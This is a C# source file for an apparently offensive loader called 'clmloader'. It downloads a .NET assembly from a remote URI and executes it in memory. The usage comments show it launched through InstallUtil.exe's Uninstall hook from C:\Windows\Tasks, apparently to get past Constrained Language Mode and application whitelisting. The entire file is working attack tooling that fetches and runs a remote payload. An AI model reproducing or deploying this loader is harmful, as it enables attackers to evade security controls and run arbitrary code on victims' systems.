using System;
using System.Net;
using System.Reflection;

namespace clmloader
{
    internal class Program
    {
        static void ExecuteAssembly(Byte[] assemblyBytes, string[] param)
        {
            Assembly assembly = Assembly.Load(assemblyBytes);
            MethodInfo method = assembly.EntryPoint;
            object[] parameters = new[] { param };
            method.Invoke(null, parameters);
        }

        public static void Loader(string uri)
        {
            using (WebClient client = new WebClient())
            {
                byte[] data = client.DownloadData(uri);
                string[] args = new string[] { };
                ExecuteAssembly(data, args);
            }
        }

        // usage: clmloader.exe /uri=http://x.x.x.x/loader.exe
        static void Main(string[] args)
        {
            string uri = null;
            foreach (string arg in args)
            {
                if (arg.StartsWith("/uri=", StringComparison.OrdinalIgnoreCase))
                {
                    uri = arg.Substring("/uri=".Length).Trim('"');
                    break;
                }
            }
            if (string.IsNullOrEmpty(uri))
            {
                throw new ArgumentException("Missing /uri= parameter!");
            }
            Loader(uri);
        }
    }

    // usage: C:\Windows\Microsoft.NET\Framework64\v4.0.30.30319\InstallUtil.exe /logfile= /LogToConsole=false /uri=http://x.x.x.x/loader.exe /U "C:\Windows\Tasks\clmloader.exe"
    [System.ComponentModel.RunInstaller(true)]
    public class Loader : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            base.Uninstall(savedState);
            string uri = this.Context.Parameters["uri"];
            if (string.IsNullOrEmpty(uri))
            {
                throw new ArgumentException("Missing /uri= parameter!");
            }
            Program.Loader(uri);
        }
    }
}
